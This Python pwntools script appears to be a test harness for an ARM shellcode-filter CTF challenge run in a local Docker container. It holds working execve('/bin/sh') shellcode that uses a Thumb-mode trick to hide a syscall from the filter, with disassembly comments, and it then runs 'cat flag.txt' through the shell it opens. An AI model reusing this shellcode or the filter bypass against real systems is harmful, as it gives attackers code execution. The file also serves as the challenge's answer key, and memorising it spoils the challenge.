#!/usr/bin/env python3
from pwn import *
import subprocess
from typing import NamedTuple
import traceback

HOST = "localhost"
PORT = 5000
class TestCase(NamedTuple):
    name: str
    shellcode: str
    expect_success: bool

cases = []

# <CsInsn 0x0 [0010a0e3]: mov r1, #0>
# <CsInsn 0x4 [0020a0e3]: mov r2, #0>
# <CsInsn 0x8 [0b70a0e3]: mov r7, #0xb>
# <CsInsn 0xc [0f00a0e1]: mov r0, pc>
# <CsInsn 0x10 [000000ef]: svc #0>
cases.append(TestCase('Simple SVC',
                      '0010a0e30020a0e30b70a0e30f00a0e1000000ef2f62696e2f736800',
                      False))

# <CsInsn 0x0 [00df01e3]: movw sp, #0x1f00> # dummy, in thumb means svc #0
# <CsInsn 0x4 [0b70a0e3]: mov r7, #0xb> # r7 = execve opcode
# <CsInsn 0x8 [0c008fe2]: add r0, pc, #0xc> # 0x1c is "/bin/sh" (first arg of execve)
# <CsInsn 0xc [0020a0e3]: mov r2, #0> # second arg (argv) = 0
# <CsInsn 0x10 [00309fe5]: ldr r3, [pc]> # Loads the data of pc = 0xdead0001 to r3
# <CsInsn 0x14 [13ff2fe1]: bx r3> # 0xdead0001 points to first inst. first inst is 0xdf00 which means svc #0
# <CsInsn 0x18 [0100adde]: cdple p0, #0xa, c0, c13, c1, #0>
# <CsInsn 0x1c [2f62696e]: cdpvs p2, #6, c6, c9, c15, #1>
# <CsInsn 0x20 [2f736800]: rsbeq r7, r8, pc, lsr #6>
# <CsInsn 0x24 [1800adde]: mcrle p0, #5, r0, c13, c8, #0>
# <CsInsn 0x28 [00000000]: andeq r0, r0, r0>
cases.append(TestCase('Working',
                      '00df01e30b70a0e30c008fe20020a0e300309fe513ff2fe10100adde2f62696e2f7368001800adde00000000',
                      True))

# <CsInsn 0x0 [00df01e3]: movw sp, #0x1f00> # dummy, in thumb means svc #0
# <CsInsn 0x4 [0b70a0e3]: mov r7, #0xb> # r7 = execve opcode
# <CsInsn 0x8 [0c008fe2]: add r0, pc, #0xc> # 0x1c is "/bin/sh" (first arg of execve)
# <CsInsn 0xc [0020a0e3]: mov r2, #0> # second arg (argv) = 0
# <CsInsn 0x10 [00309fe5]: ldr r3, [pc]> # Loads the data of pc = 0xdead0001 to r3
# <CsInsn 0x14 [13ff2fe1]: bx r3> # 0xdead0001 points to first inst. first inst is 0xdf00 which means svc #0
# <CsInsn 0x18 [0100adde]: cdple p0, #0xa, c0, c13, c1, #0>
# <CsInsn 0x1c [2f62696e]: cdpvs p2, #6, c6, c9, c15, #1>
# <CsInsn 0x20 [2f736800]: rsbeq r7, r8, pc, lsr #6>
cases.append(TestCase('Working trimmed',
                      '00df01e30b70a0e30c008fe20020a0e300309fe513ff2fe10100adde2f62696e2f7368001800',
                      True))


# bytes(ks.asm("nop\n"*int(0x1f8/8) + "svc 0")[0]).hex()

cases.append(TestCase('Buncha nops plus svc',
             '00f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e300f020e3000000ef',
             False))


cases.append(TestCase('First instruction bad, rest is normal shellcode from first case',
             '700000010010a0e30020a0e30b70a0e30f00a0e1000000ef2f62696e2f736800',
             False))



def did_fail(result: subprocess.CompletedProcess) -> bool:
    return not result.stdout.contains('foo')

def does_get_flag(case: TestCase, flag: str):
    conn = remote('localhost', PORT)
    conn.recvuntil(b'up to 512 chars\n')

    conn.sendline(case.shellcode.encode())

    conn.recvuntil(b'***\n')
    conn.recvuntil(b'\n*** ')
    msg = conn.recvuntil(b'***\n')
    try:
        conn.sendline(b"cat flag.txt")
        msg2 = conn.recvline()
        if msg2.decode().strip() == flag:
            return True


    except EOFError:
        pass

    conn.close()

    return False

def does_pass_filter(case: TestCase):
    conn = remote(HOST, PORT)
    conn.recvuntil(b'up to 512 chars\n')

    conn.sendline(case.shellcode.encode())

    msg = conn.recvuntil(b'***\n')
    conn.recvuntil(b'*** ')
    msg = conn.recvuntil(b'***\n')
    



    conn.close()

    print(msg)

    return "looks good" in msg.decode()    
    


with open('flag.txt', 'r') as f:
    flag = f.read().strip()

print(f">< Correct flags: {flag}")


print(">< Starting challenge")
p = subprocess.run(["docker", "run", "--network=host", "-d", "-e", f"PORT={PORT}", "saas"], capture_output=True)
container = p.stdout.decode().strip()
print(f">< Challenge started in {container}")

try:
    for case in cases:
        print(f"Running {case.name} ")
        if case.expect_success:
            result = does_get_flag(case, flag)
        else:
            result = not does_pass_filter(case)

        if result:
            print(f"{case.name}: \033[32mSuccess\033[0m")
        else:
            print(f"{case.name}: \033[31mFail\033[0m")
finally:
    print(traceback.format_exc())
    print(">< Stopping challenge")
    subprocess.run(["docker", "stop", container])